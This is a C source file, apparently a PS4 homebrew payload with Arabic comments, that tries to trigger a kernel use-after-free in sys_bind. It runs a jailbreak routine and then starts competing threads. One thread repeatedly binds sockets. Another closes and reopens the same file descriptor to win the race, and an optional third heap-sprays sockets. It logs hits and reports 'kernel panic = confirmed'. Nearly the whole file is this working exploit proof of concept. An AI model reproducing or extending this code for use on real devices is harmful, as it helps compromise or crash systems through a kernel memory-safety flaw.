#include "ps4.h"

static volatile int g_fd      = -1;
static volatile int g_running =  1;
static volatile int g_hits    =  0;

// Thread B — يغلق ويعيد فتح fd باستمرار
void* thread_close_open(void* arg) {
    printf_debug("thread_B start\n");

    while (g_running) {
        int fd = g_fd;
        if (fd == -1) continue;

        // [1] أغلق الـ fd
        sceNetSocketClose(fd);

        // [2] افتح fd جديد — سيأخذ نفس الرقم
        int new_fd = sceNetSocket("spray", AF_INET, SOCK_STREAM, 0);
        if (new_fd == fd) {
            g_hits++;
            printf_debug("[!] fd reuse #%d fd=%d\n", g_hits, fd);
        }
    }
    return NULL;
}

// Thread C — heap spray
void* thread_spray(void* arg) {
    printf_debug("thread_C start\n");

    while (g_running) {
        int fds[16];
        for (int i = 0; i < 16; i++) {
            fds[i] = sceNetSocket("s", AF_INET, SOCK_STREAM, 0);
        }
        for (int i = 0; i < 16; i++) {
            if (fds[i] > 0) sceNetSocketClose(fds[i]);
        }
    }
    return NULL;
}

// Thread A — يستدعي bind باستمرار
void* thread_bind(void* arg) {
    printf_debug("thread_A start\n");

    while (g_running) {
        // أنشئ socket
        int fd = sceNetSocket("poc", AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;

        g_fd = fd;

        // sockaddr
        struct sockaddr_in addr;
        addr.sin_len    = sizeof(struct sockaddr_in);
        addr.sin_family = AF_INET;
        addr.sin_port   = sceNetHtons(8080);
        addr.sin_addr.s_addr = IP(127, 0, 0, 1);
        memset(addr.sin_zero, 0, sizeof(addr.sin_zero));

        // bind —  race window 
        sceNetBind(fd, (struct sockaddr*)&addr, sizeof(addr));

        sceNetSocketClose(fd);
        g_fd = -1;
    }
    return NULL;
}

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initPthread();
    initNetwork();
    jailbreak();
    initSysUtil();

    printf_debug("=== sys_bind ===\n");
    printf_debug("Bug: fget race → sofree → UAF\n\n");

    ScePthread tA, tB, tC;

    scePthreadCreate(&tA, NULL, thread_bind,       NULL, "binder");
    scePthreadCreate(&tB, NULL, thread_close_open, NULL, "closer");
    //scePthreadCreate(&tC, NULL, thread_spray,      NULL, "sprayer");

    int seconds = 0;
    while (seconds < 30 && g_running) {
        int i = 0;
        while (i < 100000000 && g_running) i++;
        seconds++;
        printf_debug("t=%ds hits=%d\n", seconds, g_hits);
        if (g_hits > 10) break;
    }

    g_running = 0;

    scePthreadJoin(tA, NULL);
    scePthreadJoin(tB, NULL);
    //scePthreadJoin(tC, NULL);

    printf_debug("\n=== Results ===\n");
    printf_debug("fd reuse hits: %d\n", g_hits);

    if (g_hits > 0) {
        printf_debug("[+] Race triggered!\n");
        printf_debug("kernel panic = confirmed\n");
    } else {
        printf_debug("[-] No hits\n");
    }

    return 0;
}